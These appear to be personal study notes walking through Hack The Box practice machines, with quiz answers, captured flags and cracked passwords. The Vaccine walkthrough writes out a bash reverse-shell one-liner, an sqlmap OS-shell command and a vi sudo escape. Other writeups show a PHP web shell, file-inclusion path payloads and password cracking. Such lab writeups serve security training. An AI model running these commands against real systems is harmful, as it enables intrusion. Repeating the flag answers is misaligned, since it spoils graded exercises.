
# 1. Hack the box Machines:

## 1. Mongod (Very Easy)

- *Enumeration of open ports:*

![[Pasted image 20230406154341.png]]

- *Instalation of mongodb-clients after finding open port with monofb service (MongoDB 3.6.8)*

![[Pasted image 20230406154539.png]]

- *Connection to Mongodb shell version v.6.0.1*

![[Pasted image 20230406154650.png]]

- *help menu*

![[Pasted image 20230406154756.png]]

- *To view all databases*

![[Pasted image 20230406154937.png]]

- *Connect to some database*

![[Pasted image 20230406155025.png]]

- *To view all collection in current database*

![[Pasted image 20230406155154.png]]

- *View data in collection name flag in a format that is easy to read*

![[Pasted image 20230406155415.png]]

## 2. Syneced (Very Easy)

1. What is the default port for rsync?

```
Port 873
```

2. How many TCP ports are open on the remote host?

```
1
```

3. What is the protocol version used by rsync on the remote host?

```
protocol version 31
```

4. What is the most common commad name on Linux interact with rsync?

```
rsync
```

5. What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync 

```
None
```

6. What is the option to only list shares and files on rsync? (No need to include the leading -- characters) 

```
--list-only
```

![[Pasted image 20230413170523.png]]

- Download the Flag:

![[Pasted image 20230413170619.png]]

## 3. Appointment (Very Easy)

1. What is does the acronym SQL stand for?

```
Structured Query Language.
```

2. What is one of most common type of SQL Vulnerability?

```
sql injection
```

3. What is a PII stand for?

```
Personal Identifiable Information
```

4. What is the 2021 OWASP Top 10 classification for this vulnerability? 

```
A03:2021-Injection
```

5. What does Nmap report as the service and version that are running on port 80 of the target?

```
Apache httpd 2.4.38 ((Debian)) 
```

6. What is the standard port used for the HTTPS protocol? 

```
443
```

7. What is a folder called in web-application terminology?

```
directory
```

8. What is the HTTP response code is given for 'Not Found' errors? 

```
404
```

9. Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? 

```
dir
```

10. What single character can be used to comment out the rest of a line in MySQL?

```
#
```

11. If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? 

```
Congratulations 
```

12. Submit root flag 

```
e3d0796d002a446c0e622226f42e9672 
```

## 4. Squel (Very Easy)

1. During our scan, which port do we find serving MySQL? 

```
3306
```

2. What community-developed MySQL version is the target running? 

```
MariaDB
```

3. When using the MySQL command line client, what switch do we need to use in order to specify a login username?

```
-u
```

4. Which username allows us to log into this MariaDB instance without providing a password? 

```
root
```

![[Pasted image 20230417085824.png]]

- To view all databases in curront sql server use command:

```
shwo databases;
```
![[Pasted image 20230417085904.png]]

- To use some database we need to type command:

```
use + <nama_database>
```

![[Pasted image 20230417090054.png]]

5. In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

```
*
```

6. In SQL, what symbol do we need to end each query with? 

```
;
```

7. There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? 

```
htb
```

8. Submit root flag 

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

![[Pasted image 20230417090252.png]]

## 5. Crocodile (Very Easy)

1. What Nmap scanning switch employs the use of default scripts during a scan? 

```
-sC
```

2. What service version is found to be running on port 21? 

```
vsftpd 3.0.3
```

3. What FTP code is returned to us for the "Anonymous FTP login allowed" message?

```
230
```

4. After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?

```
anonymous
```

5. After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? 

```
get
```

6. What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? 

```
admin
```

7. What version of Apache HTTP Server is running on the target host? 

```
Apache httpd 2.4.41 
```

8. What switch can we use with Gobuster to specify we are looking for specific filetypes? 

```
-x
```

9. Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? 

```
login.php
```

10. Submit root flag 

```
c7110277ac44d78b6a9fff2232434d16 
```

## 6. Responder (Very Easy)

*Nmap to host:*
![[Pasted image 20230421122247.png]]

1. When visiting the web service using the IP address, what is the domain that we are being redirected to? 

```
unika.htb
```

*add the SSL to the hosts for curont IP*
![[Pasted image 20230421122517.png]]

2. Which scripting language is being used on the server to generate webpages?

```
php
```

3. What is the name of the URL parameter which is used to load different language versions of the webpage? 

```
page
```

![[Pasted image 20230421122625.png]]

4. Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

```
../../../../../../../../windows/system32/drivers/etc/hosts
```

![[Pasted image 20230421122709.png]]

5. Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 

```
//10.10.14.6/somefile
```

*Run Responder Tool on interface tun0:*
![[Pasted image 20230421122930.png]]

*IP on tun0 = 10.10.14.99 (винаги трябва да се даде ip на интерфейса който използваме*
![[Pasted image 20230421123311.png]]

*Add to parametar page=//<ip_on_tun0>/filename*
![[Pasted image 20230421123028.png]]

*Responder capture the hash by reloading the page*
![[Pasted image 20230421123440.png]]

*create a file with the hash*
![[Pasted image 20230421123642.png]]

*brute-force the hash with tool hashcat (-m =mode on the hash)*
https://hashcat.net/wiki/doku.php?id=example_hashes#generic_hash_types (for all mode)
![[Pasted image 20230421123800.png]]

*cracked the password for administrator (password=badminton)*
![[Pasted image 20230421124010.png]]

*login to the server with founded user and passowrd with tool evil-winrm*
![[Pasted image 20230421124134.png]]

6. What does NTLM stand for? 

```
New Technology Lan Manager
```

7. Which flag do we use in the Responder utility to specify the network interface? 

```
-I
```

8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 

```
John the Ripper 
```

9. What is the password for the administrator user? 

```
badminton 
```

10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 

```
5985 
```

11. Submit the flag

```
ea81b7afddd03efaa0945333ed147fac 
```

## 7. Tree (Vary easy)

1. How many TCP ports are open? 

```
2
```

![[Pasted image 20230511125730.png]]

2. What is the domain of the email address provided in the "Contact" section of the website? 

```
thetoppers.htb
```

3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

```
/etc/hosts
```

4. Which sub-domain is discovered during further enumeration? 

```
s3.thetoppers.htb 
```

5. Which service is running on the discovered sub-domain? 

```
Amazon S3 
```

6. Which command line utility can be used to interact with the service running on the discovered sub-domain? 

```
awscli
```

![[Pasted image 20230511153807.png]]

7. Which command is used to set up the AWS CLI installation? 

```
aws configure
```

![[Pasted image 20230511153728.png]]

8. What is the command used by the above utility to list all of the S3 buckets?

```
aws s3 ls
```

![[Pasted image 20230511153706.png]]

9. This server is configured to run files written in what web scripting language? 

```
php
```

![[Pasted image 20230511154004.png]]

10.  Submit root flag 

- Create a php shell:

![[Pasted image 20230511154521.png]]

- Upload shell to the server:

![[Pasted image 20230511154712.png]]

- Test payload if it's work:

![[Pasted image 20230511155229.png]]


- Run payload and capturing the flag

```
shell.php?cmd=cat+../flag.txt
```

![[Pasted image 20230512125628.png]]

## 8. Ignition (Very Easy)

IP: 10.129.127.14

1. Which service version is found to be running on port 80? 

```
nginx 1.14.2
```

2. What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? 

```
302
```

3. What is the virtual host name the webpage expects to be accessed by? 

```
ignition.htb 
```

4.  What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? 

```
/etc/hosts 
```

5. Use a tool to brute force directories on the webserver. What is the full URL to the Magento login page? 

```
http://ignition.htb/admin 
```

6. Look up the password requirements for Magento and also try searching for the most commong passwords of 2023. Which password provides access to the admin account? 

```
qwerty123 
```

7. Submit root flag 

```
797d6c988d9dc5865e010b9410f247e0
```

## 9. Bike (Very Easy)

10.129.97.64

1. What is TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.

```
22,80
```

2. What software is running the service listening on the http/web port identified in the first question?

```
Node.js
```

3. What is the name of the Web Framework according to Wappalzzer?

```
Express
```

4. What is the name of the vulnerability we test for by submitting {{7 x 7}}?

```
server side template injection
```

5. What is the templating engine being used within Node.js?

```
handlebars
```

6. What is the name of the BurpSuite tab used to encode text?

```
decoder
```

7. In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?

```
URL
```

8. When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?

```
require
```

9. What variable is the name of the top-level scope in Node.js

```
global
```

10. By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?

```
root
```

11. Submit root flag

```
6b258d726d287462d60c103d0142a81c
```

## 10. Funnel (Very Easy)

10.129.228.195

1. How many TCP ports are open? 

```
2
```

2. What is the name of the directory that is available on the FTP server? 

```
mail_backup
```

3. What is the default account password that every new member on the "Funnel" team should change as soon as possible?

```
funnel123#!#
```

4. Which user has not changed their default password yet? 

```
christine
```

5. Which service is running on TCP port 5432 and listens only on localhost? 

```
postgresql
```

6. Since you can't access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?

```
local port forwarding 
```

7. What is the name of the database that holds the flag? 

```
secrets 
```

8. Could you use a dynamic tunnel instead of local port forwarding? Yes or No.

```
Yes
```

9. Submit root flag 

```
cf277664b1771217d7006acdea006db1 
```

## 11. Pennyworth (Very Easy)

10.129.38.123

1. What does the acronym CVE stand for? 

```
Common Vulnerabilities and Exposures
```

2. What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for? 

```
Confidentiality, Integrity, Availability
```

3. What is the version of the service running on port 8080? 

```
Jetty 9.4.39.v20210325
```

4. What version of Jenkins is running on the target? 

```
2.289.1
```

5. What type of script is accepted as input on the Jenkins Script Console? 

```
Groovy
```

6.  What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows? 

```
cmd.exe 
```

7. What is a different command than "ip a" we could use to display our network interfaces' information on Linux?

```
ifconfig
```

8. What switch should we use with netcat for it to use UDP transport mode? 

```
-u
```

9.  What is the term used to describe making a target host initiate a connection back to the attacker host? 

```
reverse shell
```

10. Submit the flag

```
9cdfb439c7876e703e307864c9167a15
```


## 12. Tactics (Very Easy)

10.129.215.62

1. Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall? 

```
-Pn 
```

2. What does the 3-letter acronym SMB stand for? 

```
Server Message Block
```

3.  What port does SMB use to operate at? 

```
445
```

4.  What command line argument do you give to `smbclient` to list available shares? 

```
-L
```

![[Pasted image 20230523183352.png]]

5.  What character at the end of a share name indicates it's an administrative share? 

```
$
```

6.  Which Administrative share is accessible on the box that allows users to view the whole file system? 

```
C$
```

![[Pasted image 20230523183458.png]]

7. What command can we use to download the files we find on the SMB Share? 

```
get
```

![[Pasted image 20230523183534.png]]

8. Which tool that is part of the Impacket collection can be used to get an interactive shell on the system? 

```
PSexec.py 
```

9. Submit root flag 

```
 f751c19eda8f61ce81827e6930a1f40c
```


## 13. Archetype (Very Easy)

10.129.104.105

10.129.248.240 

10.10.14.79

1. Which TCP port is hosting a database server? 

```
1433
```

![[Pasted image 20230526093957.png]]

2. What is the name of the non-Administrative share available over SMB? 

```
backups
```

![[Pasted image 20230526094540.png]]

3. What is the password identified in the file on the SMB share? 

```
M3g4c0rp123
```

![[Pasted image 20230526095818.png]]

4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? 

```
myssqlclient.py
```

![[Pasted image 20230526102617.png]]

5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? 

```
xp_cmdshell
```

![[Pasted image 20230602100015.png]]

6. What script can be used in order to search possible paths to escalate privileges on Windows hosts? 

```
winPEAS
```

7. What file contains the administrator's password? 

```
ConsoleHost_history.txt 
```

8.  Submit user flag 

```
3e7b102e78218e935bf3f4951fec21a3
```

9.  Submit root flag 

```
b91ccec3305e98240082d4474b848528
```

## 14. Oopsie (Very Easy)

10.129.195.157

1. With what kind of tool can intercept web traffic?

```
Proxy 
```

2. What is the path to the directory on the webserver that returns a login page? 

```
cdn-cgi/login
```

3. What can be modified in Firefox to get access to the upload page? 

```
cookie
```

4. What is the access ID of the admin user? 

```
34322
```

5. On uploading a file, what directory does that file appear in on the server? 

```
/uploads
```

6. What is the file that contains the password that is shared with the robert user? 

```
db.php
```

7. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 

```
find
```

8. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? 

```
root
```

9. What SUID stands for? 

```
Set owner User ID
```

10. What is the name of the executable being called in an insecure manner? 

```
cat
```

11. Submit user flag 

```
f2c74ee8db7983851ab2a96a44eb7981
```

12. Submit root flag 

```

```


## 15. Vaccine

IP Address: 10.129.37.140 

1. Besides SSH and HTTP, what other service is hosted on this box? 

```
ftp
```

![[Pasted image 20230623133153.png]]

2. This service can be configured to allow login with any password for specific username. What is that username? 

```
anonymous
```

![[Pasted image 20230623133240.png]]

3. What is the name of the file downloaded over this service? 

```
backup.zip
```

4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? 

```
zip2john backup.zip > hash.txt
```

![[Pasted image 20230623134111.png]]

- This command create hash.txt file with hash

![[Pasted image 20230623133928.png]]

- to crack the hash use command:

```
john hash.txt
```

![[Pasted image 20230623134230.png]]

- After cracking password from zip file we can now unzip the file

![[Pasted image 20230623134422.png]]

- Now we seen the password for admin user but the password is hashed:

![[Pasted image 20230623134617.png]]

- We need to crack the hash:

![[Pasted image 20230623134714.png]]

5. What is the password for the admin user on the website? 

```
username: admin
password: qwerty789
```

![[Pasted image 20230623134826.png]]

![[Pasted image 20230623134909.png]]

6. What option can be passed to sqlmap to try to get command execution via the sql injection? 

```
--os-shell
```

- We get same valid request with burp suite:

![[Pasted image 20230623135105.png]]

- Copy request and create new file with him:

![[Pasted image 20230623135309.png]]
![[Pasted image 20230623135351.png]]

- Run sqlmap with this request

```
sqlmap request.req --os-shell
```

![[Pasted image 20230623135456.png]]

![[Pasted image 20230623135618.png]]

- After we have shell we can take reverse shell 

```
run nc to lisstening on port 443
```

![[Pasted image 20230623135917.png]]

- after that run this command on the server sait

```
bash -c "bash -i >& /dev/tcp/{IP-Address}/443 0>&1"
```

![[Pasted image 20230623140018.png]]

- And than we have a connection:

![[Pasted image 20230623140326.png]]

- We can run command for python interactive shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

7. What program can the postgres user run as root using sudo? 

```
vi
```

- Now we can look wor passwords in /var/www/html

![[Pasted image 20230623140840.png]]

- In dashboard.php we found user and password:

![[Pasted image 20230623141015.png]]

- We can try to connect as with ssh with this user and password

![[Pasted image 20230623141119.png]]

- Now we are inside the server and we can try privileage escalation:

```
sudo -l
```

![[Pasted image 20230623141306.png]]

- We are gooing to GTFOBins (https://gtfobins.github.io/gtfobins/vi/#sudo) to abuse the privilage

```
sudo /bin/vi /etc/postgresql/11/main/pg-hba.conf

:set shell=/bin/sh
:shell
```

![[Pasted image 20230623141844.png]]

8. Submit user flag 

```
ec9b13ca4d6229cd5cc1e09980965bf7
```

![[Pasted image 20230623140510.png]]

9. Submit root flag 

```
dd6e058e814260bc70e9bbdef2715849
```

## 16. Unified (Very Easy)

IP: 10.129.134.34

1. Which are the first four open ports? 

```
22, 6789, 8080, 8443
```

![[Pasted image 20230718114252.png]]

![[Pasted image 20230718114332.png]]

2. What is the title of the software that is running running on port 8443? 

```
UniFi Network
```

3. What is the version of the software that is running? 

```
6.4.54
```

![[Pasted image 20230718134123.png]]

4. What is the CVE for the identified vulnerability? 

```
CVE-2021-44228 
```

5. What protocol does JNDI leverage in the injection? 

```
ldap
```

6. What tool do we use to intercept the traffic, indicating the attack was successful?

```
tcpdump
```

![[Pasted image 20230718163748.png]]

7. What port do we need to inspect intercepted traffic for? 

```
389
```


## 17. Included (Very Easy)

10.129.95.185

1. What service is running on the target machine over UDP? 

```
tftp
```

![[Pasted image 20230912094002.png]]
![[Pasted image 20230912094338.png]]

2. What class of vulnerability is the webpage that is hosted on port 80 vulnerable to? 

```
Local File Inclusion
```

![[Pasted image 20230912091112.png]]

3. What is the default system folder that TFTP uses to store files?

```
/var/lib/tftpboot/
```

4. Which interesting file is located in the web server folder and can be used for Lateral Movement? 

```
.htpasswd
```

![[Pasted image 20230913085056.png]]



5. What is the group that user Mike is a part of and can be exploited for Privilege Escalation?

```
lxd
```

![[Pasted image 20230913085232.png]]

6. When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?

```
alpine
```

7. What flag do we set to the container so that it has root privileges on the host system? 

```
security.privileged=true 
```


8. If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted? 

```
/mnt/root/
```

9. Submit user flag 

```
a56ef91d70cfbf2cdb8f454c006935a1
```

![[Pasted image 20230913085624.png]]

10. Submit root flag 

```
c693d9c7499d9f572ee375d4c14c7bcf
```

![[Pasted image 20230913095505.png]]
